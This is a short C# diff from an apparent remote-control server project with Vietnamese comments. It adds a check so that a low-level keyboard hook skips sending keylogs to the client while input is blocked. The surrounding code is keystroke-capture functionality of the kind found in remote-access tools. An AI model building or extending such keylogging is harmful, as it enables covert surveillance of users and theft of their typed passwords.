@@ -3,6 +3,7 @@ using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Threading;
 using System.Windows.Forms;
+using RemoteControlServer.Helpers;
 
 namespace RemoteControlServer.Services
 {
@@ -96,6 +97,12 @@ namespace RemoteControlServer.Services
 
                 // Bỏ qua phím ảo do phần mềm khác bắn ra
                 if ((kbStruct.flags & LLKHF_INJECTED) != 0)
+                {
+                    return CallNextHookEx(_hookID, nCode, wParam, lParam);
+                }
+
+                // KIỂM TRA: Nếu input đang bị block, không gửi keylog về client
+                if (SystemHelper.IsInputBlocked)
                 {
                     return CallNextHookEx(_hookID, nCode, wParam, lParam);
                 }
